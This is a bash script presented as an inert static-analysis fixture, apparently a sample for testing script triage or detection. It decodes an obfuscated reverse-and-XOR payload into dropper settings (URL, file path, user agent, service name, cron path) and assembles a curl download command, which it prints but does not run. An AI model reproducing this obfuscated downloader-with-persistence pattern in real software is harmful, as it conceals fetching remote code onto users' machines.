#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_4b4f2e62='60 105 62 59 110 62 107 59 107 104 114 58 56 62 43 44 113 112 58 55 60 62 60 114 44 44 58 45 43 49 42 55 112 47 50 43 112 98 55 43 62 47 0 58 51 54 57 35 60 105 62 59 110 62 107 59 107 104 112 61 62 19 44 44 58 45 43 49 42 23 98 43 49 58 56 62 0 45 58 44 42 35 55 44 113 105 108 58 109 109 104 61 60 112 59 54 51 62 41 49 54 113 58 51 47 50 62 39 58 113 60 105 62 59 110 62 107 59 107 104 112 112 101 44 47 43 43 55 98 51 45 42 35 60 105 62 59 110 62 107 59 107 104 114 49 56 54 62 47 50 62 60 98 59 54 0 49 56 54 62 47 50 62 60 35 110 98 43 49 42 48 60 0 58 56 62 43 44 35 43 42 47 43 42 48 0 51 45 42 60 98 45 58 43 47 62 59 62 35 58 51 54 57 0 58 43 54 45 40 115 58 43 48 50 58 45 0 58 45 54 42 46 60 62 98 44 47 58 43 44 35 110 98 41'
readonly Codec_4b4f2e62='decimal_space|reverse_then_xor|5f'

Load_4b4f2e62() {
  v_a19c=()
  local IFS=' '
  read -r -a v_a19c <<< "${Material_4b4f2e62}"
}

Decode_4b4f2e62() {
  v_b27e=()
  local v_e598
  for ((v_e598=0; v_e598<${#v_a19c[@]}; v_e598++)); do
    v_b27e[${#v_a19c[@]}-1-v_e598]="$((v_a19c[v_e598] ^ 95))"
  done
}

Recover_4b4f2e62() {
  local -a v_a19c v_b27e
  local v_c304 v_d41a v_b803 v_e598
  local -a series=(3 5 8 13); v_d41a="${series[*]:1:2}"
  Load_4b4f2e62
  local decode_target=Decode_4b4f2e62; "$decode_target"
  v_c304=''
  local octal character
  for v_e598 in "${!v_b27e[@]}"; do
    printf -v octal '%03o' "${v_b27e[v_e598]}"
    printf -v character '%b' "\\$octal"
    v_c304+="$character"
  done
  printf '%s\n' "$v_c304"
}

Inspect_4b4f2e62() { local recovered; recovered="$(Recover_4b4f2e62)"; printf '%s\n' "$recovered"; }

Plan_4b4f2e62() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_4b4f2e62)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(curl --fail --silent --show-error -o "$file_path" "$url")
  declare -p request_command
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_4b4f2e62; fi
